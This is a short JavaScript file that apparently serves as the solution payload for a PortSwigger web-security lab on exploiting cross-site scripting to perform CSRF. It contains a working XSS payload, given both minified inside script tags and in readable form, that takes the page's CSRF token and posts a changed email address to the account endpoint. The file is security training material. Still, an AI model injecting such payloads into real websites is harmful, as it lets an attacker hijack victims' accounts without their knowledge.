// The code below serves as a payload to solve the following lab:
// https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

// The blog site reuses CSRF tokens so the program grabs one from the comment form and then
// Sends the token along with the new email address to /my-account/change-email

// Minimized version of code:
// <script>document.addEventListener("DOMContentLoaded",(function(){const e={email:"wiener2@normal-user.net",csrf:document.getElementsByTagName("form")[0].querySelector('input[type="hidden"][name="csrf"]').value},n=Object.keys(e).map((n=>`${n}=${e[n]}`)).join("&");fetch("/my-account/change-email",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:n}).then((e=>e.text())).then((()=>console.log("Success!"))).catch((()=>console.error("Failure...")))}));</script>

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementsByTagName('form')[0];
    const csrfInput = form.querySelector('input[type="hidden"][name="csrf"]');
    const csrf = csrfInput.value;

    const emailChangeData = {
        email: "wiener2@normal-user.net",
        csrf: csrf
    };

    const requestBody = Object.keys(emailChangeData)
    .map(key => `${key}=${emailChangeData[key]}`)
    .join('&');

    fetch('/my-account/change-email', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: requestBody
    })
        .then(response => response.text())
        .then(() => console.log("Success!"))
        .catch(() => console.error("Failure...")
    );
});
